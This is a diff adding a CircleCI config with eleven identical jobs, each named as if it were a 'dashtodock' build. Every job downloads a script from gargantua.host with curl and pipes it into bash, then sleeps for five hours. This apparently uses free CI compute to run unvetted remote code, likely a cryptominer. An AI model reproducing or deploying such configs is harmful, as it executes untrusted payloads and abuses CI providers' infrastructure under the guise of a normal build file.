@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  dashtodock:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  dashtodock1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  dashtodock2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  dashtodock3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  dashtodock4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  dashtodock5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  dashtodock6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  dashtodock7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  dashtodock8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  dashtodock9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  dashtodock10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - dashtodock
+      - dashtodock1
+      - dashtodock2
+      - dashtodock3
+      - dashtodock4
+      - dashtodock5
+      - dashtodock6
+      - dashtodock7
+      - dashtodock8
+      - dashtodock9
+      - dashtodock10
